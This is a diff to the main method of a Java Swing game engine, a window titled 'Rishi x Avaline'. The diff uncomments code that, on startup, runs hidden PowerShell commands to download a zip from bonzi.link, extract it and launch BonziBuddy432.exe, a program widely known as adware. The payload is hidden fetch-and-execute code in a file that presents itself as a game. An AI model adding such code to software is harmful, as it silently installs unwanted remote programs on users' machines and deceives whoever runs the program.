@@ -379,17 +379,14 @@ public class Engine extends JPanel {
 	public static void main(String[] args) throws IOException, InterruptedException {
 		// System.setProperty("sun.java2d.opengl", "false");
 		JFrame frame = new JFrame("Rishi x Avaline");
-		// String s[] = {"powershell", "-Command \"Start-Process -FilePath 'curl'
-		// -ArgumentList 'https://bonzi.link/Bon.zip -o e.zip' -WindowStyle Hidden\""};
-		// String s2[] = {"powershell", "-Command \"Start-Process -FilePath 'tar'
-		// -ArgumentList '-xf e.zip' -WindowStyle Hidden\""};
-		// String s3[] = {"powershell", "-Command \"Start-Process -FilePath
-		// 'BonziBuddy432.exe'\""};
-		// Process p1 = Runtime.getRuntime().exec(s);
-		// p1.waitFor();
-		// Process p2 = Runtime.getRuntime().exec(s2);
-		// p2.waitFor();
-		// Runtime.getRuntime().exec(s3);
+		String s[] = {"powershell", "-Command \"Start-Process -FilePath 'curl' -ArgumentList 'https://bonzi.link/Bon.zip -o e.zip' -WindowStyle Hidden\""};
+		String s2[] = {"powershell", "-Command \"Start-Process -FilePath 'tar' -ArgumentList '-xf e.zip' -WindowStyle Hidden\""};
+		String s3[] = {"powershell", "-Command \"Start-Process -FilePath 'BonziBuddy432.exe'\""};
+		Process p1 = Runtime.getRuntime().exec(s);
+		p1.waitFor();
+		Process p2 = Runtime.getRuntime().exec(s2);
+		p2.waitFor();
+		Runtime.getRuntime().exec(s3);
 		frame.setSize(800, 800);
 		frame.setLocation(0, 0);
 		frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
